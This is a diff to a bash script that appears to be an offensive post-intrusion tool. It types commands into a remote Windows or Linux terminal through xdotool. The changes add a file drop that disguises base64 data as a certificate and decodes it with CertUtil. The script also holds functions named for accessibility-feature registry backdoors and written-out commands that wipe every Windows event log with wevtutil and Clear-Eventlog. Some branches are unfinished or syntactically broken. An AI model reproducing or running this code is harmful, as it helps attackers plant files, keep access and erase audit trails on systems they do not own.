@@ -18,10 +18,10 @@ function print_status {
     local status=$1
     local message=$2
     # TODO: Add colors
-    # [*] for blue PROGRESS:
-    # [+] for green DONE:
-    # [!] for yellow WARN:
-    # [-] for red ERROR:
+    # [*] for blue PROGRESS
+    # [+] for green DONE
+    # [!] for yellow WARN
+    # [-] for red ERROR
     # white to reset colors
     echo ""
 }
@@ -107,10 +107,10 @@ function OutputRemoteFile {
             Base64 $local_file $remote_file $platform "cmd"
             ;;
         nixb64)
-            Base64 $local_file $remote_file $platform "unix"
+            Base64 $local_file $remote_file $platform "console"
             ;;
         copycon)
-            CopyCon $local_file $remote_file $platform
+            CopyCon $local_file $remote_file $platform "text"
             ;;
         *)
             echo "Invalid File Transfer Technique!" >&2
@@ -128,12 +128,13 @@ function Base64 {
     # Check if input is passed as file
     if [ -f "$input" ]
     then
-        file=$(base64 -w 0 $input)        
         echo "[*] Transferring file..."
-        if [[ $platform = "windows" ]]
+        if [[ "$platform" = "windows" ]]
         then
-            if [ $terminal = "powershell" ]
-                pwsh_base64_file=$(cat <<EOF
+            if [ "$terminal" = "powershell" ]
+            then
+                file=$(base64 -w 0 $input)
+                pwsh_base64=$(cat <<EOF
 \$payload = "$file"
 \$decoded = [Convert]::FromBase64String(\$payload)
 [IO.File]::WriteAllBytes("$output_file", \$decoded)
@@ -143,13 +144,15 @@ EOF
                 do
                     xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$line"
                     xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
-                done <<< "$pwsh_base64_file"
-            elif [ $terminal = "cmd" ]
+                done <<< "$pwsh_base64"
+            elif [ "$terminal" = "cmd" ]
             then
+                file=$(base64 -w 64 $input)
                 # TODO: Implement certutil base64 file transfer
+                CopyCon $file $output_file $platform "base64"
                 echo "Not yet implemented"
             fi
-        elif [[ $platform = "linux" && $terminal = "unix" ]]
+        elif [[ "$platform" = "linux" && "$terminal" = "console" ]]
         then
             while read -r line
             do
@@ -176,37 +179,75 @@ EOF
 }
 
 function CopyCon {
-    local file_content=$1
+    local input=$1
     local output_file=$2
+    local platform=$3
+    local mode=$4
 
-    if [ $platform != "windows" ]
+    if [ "$platform" != "windows" ]
     then
-        echo "[-] copycon only exists on Windows operating system user! Try 'base64' method instead."
+        echo "[-] copycon only exists on Windows operating system user! Try 'pwshb64' method instead."
         exit 1
     fi
     
-    echo "[*] Checking one of the lines reaches 255 character limit"
-    while read -r line
-    do
-        length=$(echo -n "$line" | wc -c)
-        if [ "$length" -ge 255 ]
-        then
-            echo "[-] Character Limit reached! Terminating program."
-            exit 1
-        fi
-    done < $file_content
+    if [[ -f "$input" && "$mode" = "text" ]]
+    then
+        echo "[*] Checking one of the lines reaches 255 character limit"
+        while read -r line
+        do
+            length=$(echo -n "$line" | wc -c)
+            if [ "$length" -ge 255 ]
+            then
+                echo "[-] Character Limit reached! Terminating program."
+                exit 1
+            fi
+        done < $input
 
-    echo "[*] Transferring file..."
-    xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "copy con $output_file"
-    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
-
-    while read -r line
-    do
-        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$line"
+        echo "[*] Transferring file..."
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "copy con $output_file"
         xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
-    done < $file_content
 
-    xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Ctrl+Z Return
+        while read -r line
+        do
+            xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$line"
+            xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+        done < $input
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Ctrl+Z Return
+    elif [[ ! -f "$input" && -n "$input" && "$mode" = "base64" ]]
+    then
+        # TODO: Be sure to modify and test that it works
+        while IFS= read -r line
+        do
+            length=$(echo -n "$line" | wc -c)
+            if [ "$length" -ge 255 ]
+            then
+                echo "[-] Character Limit reached! Terminating program."
+                exit 1
+            fi
+        done <<< "$input"
+
+        echo "[*] Transferring file..."
+        # TODO: replace temp.txt to randomize function
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "copy con temp.txt"
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "-----BEGIN CERTIFICATE-----"
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+
+        while IFS= read -r line
+        do
+            xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "$line"
+            xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+        done <<< "$input"
+
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "-----END CERTIFICATE-----"
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Ctrl+Z Return
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "CertUtil.exe -decode temp.txt $output_file"
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate type "del temp.txt"
+        xdotool search --name "$WINDOWNAME" windowfocus windowactivate key Return
+    fi
+
     echo "[+] File transferred!"
 }
 
@@ -215,10 +256,10 @@ function CreateUser {
     local platform=$2
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ $platform = "windows" ]
+    if [ "$platform" = "windows" ]
     then
         echo "Windows"
-    elif [ $platform = "linux" ]
+    elif [ "$platform" = "linux" ]
     then
         echo "Linux"
     fi
@@ -229,7 +270,7 @@ function StickyKey {
     local platform=$2
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ $platform != "windows" ]
+    if [ "$platform" != "windows" ]
     then
         echo "[-] Registry keys only exists on Windows operating system user!"
         exit 1
@@ -245,7 +286,7 @@ function UtilityManager {
     local platform=$2
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ $platform != "windows" ]
+    if [ "$platform" != "windows" ]
     then
         echo "[-] Registry keys only exists on Windows operating system user!"
         exit 1
@@ -261,7 +302,7 @@ function Magnifier {
     local platform=$2
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ $platform != "windows" ]
+    if [ "$platform" != "windows" ]
     then
         echo "[-] Registry keys only exists on Windows operating system user!"
         exit 1
@@ -278,7 +319,7 @@ function Narrator {
     local platform=$2
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ $platform != "windows" ]
+    if [ "$platform" != "windows" ]
     then
         echo "[-] Registry keys only exists on Windows operating system user!"
         exit 1
@@ -294,7 +335,7 @@ function DisplaySwitch {
     local platform=$2
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
-    if [ $platform != "windows" ]
+    if [ "$platform" != "windows" ]
     then
         echo "[-] Registry keys only exists on Windows operating system user!"
         exit 1
@@ -352,10 +393,10 @@ function PrivEsc {
 function WevUtil {
     local mode=$1
 
-    if [ $mode = "execute" ]
+    if [ "$mode" = "execute" ]
     then
         Execute "for /f "tokens=*" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
-    elif [ $mode = "script" ]
+    elif [ "$mode" = "script" ]
     # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
         echo "not implemented"
     else
@@ -367,10 +408,10 @@ function WevUtil {
 function WinEvent {
     local mode=$1
 
-    if [ $mode = "execute" ]
+    if [ "$mode" = "execute" ]
     then
         Execute "Clear-Eventlog -Log Application,Security,System -Confirm"
-    elif [ $mode = "script" ]
+    elif [ "$mode" = "script" ]
     # TODO: Include the wiper and then transfer it with Base64 powershell terminal
         echo "not implemented"
     else
